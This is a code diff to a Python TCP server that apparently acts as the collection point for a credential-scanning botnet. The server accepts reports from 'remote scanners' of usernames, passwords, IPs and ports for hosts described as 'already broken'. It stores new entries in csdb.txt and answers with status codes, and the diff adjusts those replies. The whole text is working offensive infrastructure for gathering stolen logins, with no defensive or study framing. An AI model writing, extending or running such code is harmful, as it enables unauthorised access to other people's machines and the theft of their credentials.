@@ -37,19 +37,21 @@ class ClientThread(Thread):
                     usr, psw, ip, port = data.split(relay_ps)[1], data.split(relay_ps)[2], data.split(relay_ps)[3], data.split(relay_ps)[4]
                     if ip in open("csdb.txt").read():
                         truecolors.print_errn(f"Ip: {ip} already broken, continuing ..." )
+                        self.conn.send("40".encode('ascii'))
                         break
                     else:
                         with open("csdb.txt", "a") as f:
                             f.write(f"{usr}:{psw}:{ip}:{port}\n")
                             truecolors.print_succ("Remote scanner (%s:%s) stored new credentials!" % (self.ip, str(self.port)))
+                            self.conn.send("10".encode('ascii'))
                             break
                 except Exception as e:  # in use
                     truecolors.print_errn(str(e))
-            self.conn.send("10".encode('ascii'))
+            #self.conn.send("10".encode('ascii'))
         elif data == "#":                           # 如果接收到來自scanner的測試連線 (#)
             truecolors.print_info(
                 "Received remote scanner ping (%s:%s) .." % (self.ip, str(self.port)))
-            self.conn.send("200".encode('ascii'))  #回應200確定連線成功
+            self.conn.send("200".encode('ascii'))  #return 200 --> Connect successful 
 
 
 TCP_IP = '0.0.0.0'
